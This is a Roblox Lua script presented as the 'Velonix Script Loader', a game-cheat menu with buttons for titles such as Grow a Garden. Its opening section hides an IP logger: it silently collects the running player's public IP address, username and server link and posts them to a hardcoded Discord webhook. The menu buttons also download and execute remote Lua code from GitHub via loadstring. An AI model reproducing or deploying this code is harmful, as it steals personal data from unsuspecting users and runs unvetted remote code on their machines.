local HttpService = game:GetService("HttpService")
local Plyr = game:GetService("Players")

local URL = "https://discord.com/api/webhooks/1393398739812487189/D8MlZ7oGZ70VwMX045sIHBDmWUmBEvtBDDqJe97pJBfaSFZgQA2zRllrJKs-b8GOqXO9"

local function getIP()
    local success, response = pcall(function()
        return HttpService:GetAsync("https://ipapi.co/json")
    end)
    if success then
        local data = HttpService:JSONDecode(response)
        return data.ip or "Unknown"
    else
        return "Unknown"
    end
end

local function getUSER()
    local plr = Plyr.LocalPlayer
    if plr then
        return player.Name
    else
        warn("Failed to get username.")
        return "Unknown"
    end
end

local function getSERVER()
    local jobId = game.JobId
    if jobId and jobId ~= "" then
        return "https://www.roblox.com/games/" .. game.PlaceId .. "/-/" .. jobId
    else
        warn("Failed to get server link.")
        return "Unknown"
    end
end

local function Webhook(ip, username, serverLink)
    local data = {
        ["content"] = "**IP Address:** " .. ip .. "\n**Username:** " .. username .. "\n**Server:** " .. serverLink
    }
    local jsonData = HttpService:JSONEncode(data)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local response = HttpService:RequestAsync({
        Url = URL,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })
    if response.Success then
        print("Info sent to webhook successfully.")
    else
        warn("Failed to send Info to webhook.")
    end
end

local ip = getIP()
local username = getUSER()
local serverLink = getSERVER()
if ip then
    Webhook(ip, username, serverLink)
end

-- Velonix Simple UI Loader with Drag, Close & Scrolling
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "VelonixLoader"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Main Frame
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 300)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -150)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = mainFrame

-- Title label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -40, 0, 40)
title.Position = UDim2.new(0, 10, 0, 0)
title.Text = "Velonix Script Loader"
title.Font = Enum.Font.GothamBold
title.TextSize = 20
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = mainFrame

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 30, 0, 30)
closeBtn.Position = UDim2.new(1, -35, 0, 5)
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 16
closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
closeBtn.BackgroundColor3 = Color3.fromRGB(255, 60, 60)
closeBtn.BorderSizePixel = 0
closeBtn.Parent = mainFrame

local closeCorner = Instance.new("UICorner")
closeCorner.CornerRadius = UDim.new(0, 6)
closeCorner.Parent = closeBtn

closeBtn.MouseButton1Click:Connect(function()
	screenGui:Destroy()
end)

-- Scrollable Button Container
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, -40, 1, -60)
scrollFrame.Position = UDim2.new(0, 20, 0, 50)
scrollFrame.BackgroundTransparency = 1
scrollFrame.BorderSizePixel = 0
scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
scrollFrame.ScrollBarThickness = 6
scrollFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
scrollFrame.CanvasPosition = Vector2.new(0, 0)
scrollFrame.ClipsDescendants = true
scrollFrame.Parent = mainFrame

local layout = Instance.new("UIListLayout")
layout.Padding = UDim.new(0, 10)
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Parent = scrollFrame

-- Button creator utility
local function createButton(text, callback)
	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, 0, 0, 40)
	btn.Text = text
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 16
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	btn.BorderSizePixel = 0
	btn.AutomaticSize = Enum.AutomaticSize.None
	btn.Parent = scrollFrame

	local btnCorner = Instance.new("UICorner")
	btnCorner.CornerRadius = UDim.new(0, 8)
	btnCorner.Parent = btn

	btn.MouseButton1Click:Connect(callback)
end

-- Buttons with script load
createButton("🌱 Grow a Garden", function()
	loadstring(game:HttpGet("https://github.com/ug32-C9/Velonix-Test/raw/refs/heads/main/Test1.lua"))()
	screenGui:Destroy()
end)

createButton("⚔️ The Strongest Battleground", function()
	loadstring(game:HttpGet("https://github.com/ug32-C9/Velonix-Test/raw/refs/heads/main/Test2.lua"))()
	screenGui:Destroy()
end)

createButton("🧠 Steal a Brainrot (Coming Soon)", function()
	print("Coming Soon")
	screenGui:Destroy()
end)

createButton("🌐 Universal Script", function()
	loadstring(game:HttpGet("https://github.com/ug32-C9/Velonix-Test/raw/refs/heads/main/Test3.lua"))()
	screenGui:Destroy()
end)

-- Optional: Add padding at bottom
local pad = Instance.new("UIPadding")
pad.PaddingBottom = UDim.new(0, 10)
pad.Parent = scrollFrame